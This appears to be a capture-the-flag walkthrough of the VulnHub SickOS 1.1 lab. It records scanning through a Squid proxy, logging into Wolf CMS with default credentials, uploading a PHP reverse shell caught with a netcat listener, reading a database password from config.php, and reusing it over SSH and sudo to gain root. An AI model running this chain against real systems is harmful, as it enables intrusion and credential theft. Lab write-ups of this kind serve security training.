@@ -1,0 +1,409 @@
+URL : https://www.vulnhub.com/entry/sickos-11,132/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+ Currently scanning: 172.27.217.0/16   |   Screen View: Unique Hosts                                                                                                                                              
+
+ 6 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 360                                                                                                                                                  
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.174.1   00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.2   00:50:56:ff:fc:d3    02    120   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.142 00:0c:29:4c:c5:75    01    060   VMware, Inc.                                                                                                                                                    
+ 192.168.174.254 00:50:56:ef:b0:5b    02    120   VMWare, Inc.                                                                                                                                                    
+
+root@kali:~# 
+
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A -v -T4 192.168.174.142
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-12-17 13:39 EST
+NSE: Loaded 118 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating ARP Ping Scan at 13:39
+Scanning 192.168.174.142 [1 port]
+Completed ARP Ping Scan at 13:39, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 13:39
+Completed Parallel DNS resolution of 1 host. at 13:39, 0.02s elapsed
+Initiating SYN Stealth Scan at 13:39
+Scanning 192.168.174.142 [65535 ports]
+Discovered open port 22/tcp on 192.168.174.142
+Discovered open port 3128/tcp on 192.168.174.142
+SYN Stealth Scan Timing: About 22.41% done; ETC: 13:41 (0:01:47 remaining)
+SYN Stealth Scan Timing: About 58.00% done; ETC: 13:41 (0:00:44 remaining)
+Completed SYN Stealth Scan at 13:41, 88.48s elapsed (65535 total ports)
+Initiating Service scan at 13:41
+Scanning 2 services on 192.168.174.142
+Completed Service scan at 13:41, 11.03s elapsed (2 services on 1 host)
+Initiating OS detection (try #1) against 192.168.174.142
+NSE: Script scanning 192.168.174.142.
+Initiating NSE at 13:41
+Completed NSE at 13:41, 3.35s elapsed
+Nmap scan report for 192.168.174.142
+Host is up (0.00060s latency).
+Not shown: 65532 filtered ports
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
+|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
+|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
+3128/tcp open   http-proxy Squid http proxy 3.1.19
+|_http-methods: No Allow or Public header in OPTIONS response (status code 400)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported: GET
+|_http-title: ERROR: The requested URL could not be retrieved
+8080/tcp closed http-proxy
+MAC Address: 00:0C:29:4C:C5:75 (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Uptime guess: 0.013 days (since Thu Dec 17 13:22:44 2015)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.60 ms 192.168.174.142
+
+NSE: Script Post-scanning.
+Initiating NSE at 13:41
+Completed NSE at 13:41, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 105.30 seconds
+           Raw packets sent: 131168 (5.774MB) | Rcvd: 84 (3.484KB)
+root@kali:~# 
+
+3.) Enumerating 3128/tcp
+root@kali:~# msfconsole
+msf > use auxiliary/scanner/http/squid_pivot_scanning
+msf auxiliary(squid_pivot_scanning) > show options 
+
+Module options (auxiliary/scanner/http/squid_pivot_scanning):
+
+   Name          Current Setting                                  Required  Description
+   ----          ---------------                                  --------  -----------
+   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
+   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
+   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
+   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RANGE         192.168.174.142                                  yes       IPs to scan through Squid proxy
+   RHOSTS        192.168.174.142                                  yes       The target address range or CIDR identifier
+   RPORT         3128                                             yes       The target port
+   THREADS       20                                               yes       The number of concurrent threads
+   VHOST                                                          no        HTTP server virtual host
+
+msf auxiliary(squid_pivot_scanning) > run
+
+[+] [192.168.174.142] 192.168.174.142 is alive but 21 is CLOSED
+[+] [192.168.174.142] 192.168.174.142:80 seems OPEN
+[+] [192.168.174.142] 192.168.174.142 is alive but 139 is CLOSED
+[+] [192.168.174.142] 192.168.174.142 is alive but 445 is CLOSED
+[+] [192.168.174.142] 192.168.174.142 is alive but 1433 is CLOSED
+[+] [192.168.174.142] 192.168.174.142 is alive but 1521 is CLOSED
+[+] [192.168.174.142] 192.168.174.142 is alive but 1723 is CLOSED
+[+] [192.168.174.142] 192.168.174.142 is alive but 3389 is CLOSED
+[+] [192.168.174.142] 192.168.174.142 is alive but 8080 is CLOSED
+[+] [192.168.174.142] 192.168.174.142 is alive but 9100 is CLOSED
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(squid_pivot_scanning) > 
+
+4.) Nikto via the Proxy
+root@kali:~# nikto -h 192.168.174.142 -useproxy http://192.168.174.142:3128
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.174.142
++ Target Hostname:    192.168.174.142
++ Target Port:        80
++ Proxy:              192.168.174.142:3128
++ Start Time:         2015-12-17 13:47:24 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Ubuntu)
++ Retrieved via header: 1.0 localhost (squid/3.1.19)
++ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
++ The anti-clickjacking X-Frame-Options header is not present.
++ Uncommon header 'x-cache-lookup' found, with contents: MISS from localhost:3128
++ Uncommon header 'x-cache' found, with contents: MISS from localhost
++ Server leaks inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Fri Dec  4 19:35:02 2015
++ File/dir '/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
++ Server banner has changed from 'Apache/2.2.22 (Ubuntu)' to 'squid/3.1.19' which may suggest a WAF, load balancer or proxy is in place
++ Uncommon header 'x-squid-error' found, with contents: ERR_INVALID_REQ 0
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7357 requests: 0 error(s) and 18 item(s) reported on remote host
++ End Time:           2015-12-17 13:47:48 (GMT-5) (24 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+root@kali:~# 
+
+5.) Run Dirbuster with proxy
+root@kali:~# dirb http://192.168.174.142:80 -p 192.168.174.142:3128
+
+-----------------
+DIRB v2.21    
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Dec 17 14:28:27 2015
+URL_BASE: http://192.168.174.142:80/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+PROXY: 192.168.174.142:3128
+
+-----------------
+
+GENERATED WORDS: 4592                                                          
+
+---- Scanning URL: http://192.168.174.142:80/ ----
++ http://192.168.174.142:80/cgi-bin/ (CODE:403|SIZE:291)                                                                                                                                                          
++ http://192.168.174.142:80/connect (CODE:200|SIZE:109)                                                                                                                                                           
++ http://192.168.174.142:80/index (CODE:200|SIZE:21)                                                                                                                                                              
++ http://192.168.174.142:80/index.php (CODE:200|SIZE:21)                                                                                                                                                          
++ http://192.168.174.142:80/robots (CODE:200|SIZE:45)                                                                                                                                                             
++ http://192.168.174.142:80/robots.txt (CODE:200|SIZE:45)                                                                                                                                                         
++ http://192.168.174.142:80/server-status (CODE:403|SIZE:296)                                                                                                                                                     
+                                                                                                                                                                                                                  
+-----------------
+DOWNLOADED: 4592 - FOUND: 7
+root@kali:~# 
+
+6.) Enumerating 80 by using proxy
+In Browser 
+http://192.168.174.142/robots.txt
+User-agent: *
+Disallow: /
+Dissalow: /wolfcms
+
+Set the proxy in the browser to 192.168.174.142:3128
+
+http://192.168.174.142/wolfcms/
+
+Admin Login
+https://www.wolfcms.org/forum/topic2034.html
+http://192.168.174.142/wolfcms/?/admin/login
+Username : admin
+Password : admin
+
+Upload the file using
+http://192.168.174.142/wolfcms/?/admin/plugin/file_manager/browse//
+Upload Pentestmonkey's PHP Reverse Shell
+
+Access the shell
+192.168.174.142/wolfcms/public/php-reverse-shell.php
+
+Netcat Listener
+root@kali:~# nc -lvp 1234
+listening on [any] 1234 ...
+192.168.174.142: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.174.137] from (UNKNOWN) [192.168.174.142] 41996
+Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+ 01:54:51 up  2:07,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ ls -lah
+total 84K
+drwxr-xr-x  22 root root 4.0K Sep 22 08:13 .
+drwxr-xr-x  22 root root 4.0K Sep 22 08:13 ..
+drwxr-xr-x   2 root root 4.0K Sep 22 09:11 bin
+drwxr-xr-x   3 root root 4.0K Sep 22 08:19 boot
+drwxr-xr-x  15 root root 4.1K Dec 18  2015 dev
+drwxr-xr-x  90 root root 4.0K Dec 18  2015 etc
+drwxr-xr-x   3 root root 4.0K Sep 22 08:19 home
+lrwxrwxrwx   1 root root   34 Sep 22 08:13 initrd.img -> /boot/initrd.img-3.11.0-15-generic
+drwxr-xr-x  17 root root 4.0K Sep 22 09:23 lib
+drwx------   2 root root  16K Sep 22 08:11 lost+found
+drwxr-xr-x   4 root root 4.0K Sep 22 08:12 media
+drwxr-xr-x   2 root root 4.0K Jan 10  2014 mnt
+drwxr-xr-x   2 root root 4.0K Dec  6 07:12 opt
+dr-xr-xr-x 126 root root    0 Dec 18  2015 proc
+drwx------   3 root root 4.0K Dec  6 21:14 root
+drwxr-xr-x  16 root root  620 Dec 18  2015 run
+drwxr-xr-x   2 root root 4.0K Sep 22 09:22 sbin
+drwxr-xr-x   2 root root 4.0K Mar  5  2012 selinux
+drwxr-xr-x   2 root root 4.0K Sep 22 08:11 srv
+dr-xr-xr-x  13 root root    0 Dec 18  2015 sys
+drwxrwxrwt   2 root root 4.0K Dec 18 01:54 tmp
+drwxr-xr-x  10 root root 4.0K Sep 22 08:11 usr
+drwxr-xr-x  13 root root 4.0K Dec  6 21:18 var
+lrwxrwxrwx   1 root root   30 Sep 22 08:13 vmlinuz -> boot/vmlinuz-3.11.0-15-generic
+$ ls /home
+sickos
+$ ls /var/www
+connect.py
+index.php
+robots.txt
+wolfcms
+$ ls /var/www/wolfcms
+CONTRIBUTING.md
+README.md
+composer.json
+config.php
+docs
+favicon.ico
+index.php
+public
+robots.txt
+wolf
+$ cat /var/www/wolfcms/config.php
+<?php 
+
+// Database information:
+// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
+// The path can only be absolute path or :memory:
+// For more info look at: www.php.net/pdo
+
+// Database settings:
+define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
+define('DB_USER', 'root');
+define('DB_PASS', 'john@123');
+define('TABLE_PREFIX', '');
+
+// Should Wolf produce PHP error messages for debugging?
+define('DEBUG', false);
+
+// Should Wolf check for updates on Wolf itself and the installed plugins?
+define('CHECK_UPDATES', true);
+
+// The number of seconds before the check for a new Wolf version times out in case of problems.
+define('CHECK_TIMEOUT', 3);
+
+// The full URL of your Wolf CMS install
+define('URL_PUBLIC', '/wolfcms/');
+
+// Use httpS for the backend?
+// Before enabling this, please make sure you have a working HTTP+SSL installation.
+define('USE_HTTPS', false);
+
+// Use HTTP ONLY setting for the Wolf CMS authentication cookie?
+// This requests browsers to make the cookie only available through HTTP, so not javascript for example.
+// Defaults to false for backwards compatibility.
+define('COOKIE_HTTP_ONLY', false);
+
+// The virtual directory name for your Wolf CMS administration section.
+define('ADMIN_DIR', 'admin');
+
+// Change this setting to enable mod_rewrite. Set to "true" to remove the "?" in the URL.
+// To enable mod_rewrite, you must also change the name of "_.htaccess" in your
+// Wolf CMS root directory to ".htaccess"
+define('USE_MOD_REWRITE', false);
+
+// Add a suffix to pages (simluating static pages '.html')
+define('URL_SUFFIX', '.html');
+
+// Set the timezone of your choice.
+// Go here for more information on the available timezones:
+// http://php.net/timezones
+define('DEFAULT_TIMEZONE', 'Asia/Calcutta');
+
+// Use poormans cron solution instead of real one.
+// Only use if cron is truly not available, this works better in terms of timing
+// if you have a lot of traffic.
+define('USE_POORMANSCRON', false);
+
+// Rough interval in seconds at which poormans cron should trigger.
+// No traffic == no poormans cron run.
+define('POORMANSCRON_INTERVAL', 3600);
+
+// How long should the browser remember logged in user?
+// This relates to Login screen "Remember me for xxx time" checkbox at Backend Login screen
+// Default: 1800 (30 minutes)
+define ('COOKIE_LIFE', 1800);  // 30 minutes
+
+// Can registered users login to backend using their email address?
+// Default: false
+define ('ALLOW_LOGIN_WITH_EMAIL', false);
+
+// Should Wolf CMS block login ability on invalid password provided?
+// Default: true
+define ('DELAY_ON_INVALID_LOGIN', true);
+
+// How long should the login blockade last?
+// Default: 30 seconds
+define ('DELAY_ONCE_EVERY', 30); // 30 seconds
+
+// First delay starts after Nth failed login attempt
+// Default: 3
+define ('DELAY_FIRST_AFTER', 3);
+
+// Secure token expiry time (prevents CSRF attacks, etc.)
+// If backend user does nothing for this time (eg. click some link) 
+// his token will expire with appropriate notification
+// Default: 900 (15 minutes)
+define ('SECURE_TOKEN_EXPIRY', 900);  // 15 minutes
+$ 
+
+Using the obtained creds
+root@kali:~# ssh sickos@192.168.174.142
+The authenticity of host '192.168.174.142 (192.168.174.142)' can't be established.
+ECDSA key fingerprint is 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.174.142' (ECDSA) to the list of known hosts.
+sickos@192.168.174.142's password: john@123
+Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Fri Dec 18 01:58:49 IST 2015
+
+  System load:  0.0               Processes:           116
+  Usage of /:   4.3% of 28.42GB   Users logged in:     0
+  Memory usage: 12%               IP address for eth0: 192.168.174.142
+  Swap usage:   0%
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+124 packages can be updated.
+92 updates are security updates.
+
+New release '14.04.3 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Tue Sep 22 08:32:44 2015
+sickos@SickOs:~$ sudo -s
+[sudo] password for sickos: john@123 
+root@SickOs:~# ls -lah
+total 28K
+drwxr-xr-x 3 sickos sickos 4.0K Sep 22 09:20 .
+drwxr-xr-x 3 root   root   4.0K Sep 22 08:19 ..
+-rw------- 1 sickos sickos   13 Sep 22 09:20 .bash_history
+-rw-r--r-- 1 sickos sickos  220 Sep 22 08:19 .bash_logout
+-rw-r--r-- 1 sickos sickos 3.5K Sep 22 08:19 .bashrc
+drwx------ 2 sickos sickos 4.0K Sep 22 08:32 .cache
+-rw-r--r-- 1 sickos sickos  675 Sep 22 08:19 .profile
+root@SickOs:~# cd /root/
+root@SickOs:/root# ls -lah
+total 40K
+drwx------  3 root root 4.0K Dec  6 21:14 .
+drwxr-xr-x 22 root root 4.0K Sep 22 08:13 ..
+-rw-r--r--  1 root root   96 Dec  6 07:27 a0216ea4d51874464078c618298b1367.txt
+-rw-------  1 root root 3.7K Dec  6 21:18 .bash_history
+-rw-r--r--  1 root root 3.1K Apr 19  2012 .bashrc
+drwx------  2 root root 4.0K Sep 22 08:33 .cache
+-rw-------  1 root root   22 Dec  5 06:24 .mysql_history
+-rw-r--r--  1 root root  140 Apr 19  2012 .profile
+-rw-------  1 root root 5.2K Dec  6 21:14 .viminfo
+root@SickOs:/root# cat a0216ea4d51874464078c618298b1367.txt 
+If you are viewing this!!
+
+ROOT!
+
+You have Succesfully completed SickOS1.1.
+Thanks for Trying
+
+
+root@SickOs:/root# 
